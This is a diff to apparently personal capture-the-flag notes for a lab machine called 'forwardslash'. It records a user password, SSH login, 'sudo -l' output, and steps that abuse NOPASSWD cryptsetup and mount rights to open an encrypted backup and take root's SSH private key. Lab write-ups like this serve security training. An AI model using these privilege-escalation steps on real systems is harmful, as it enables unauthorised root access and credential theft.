@@ -49,4 +49,22 @@ backup;
 ----------------------------------------------------------
 
 > password for pain:db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704
-> manual decrypt ciphertext
+> manual decrypt ciphertext.
+> login ssh as pain.
+> simple check 'sudo -l'
+
+-------------------------------------------------------------
+User pain may run the following commands on forwardslash:
+    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
+    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
+    (root) NOPASSWD: /bin/umount ./mnt/
+-------------------------------------------------------------
+
+> following those rights ,we get root
+
+pain@forwardslash:/var/backups/recovery$ sudo /sbin/cryptsetup luksOpen encrypted_backup.img backup
+> change dir to / then we can mount that img disk.
+
+pain@forwardslash:/$ sudo /bin/mount /dev/mapper/backup ./mnt/
+
+> go to /mnt/backup and we can get id_rsa that for root.
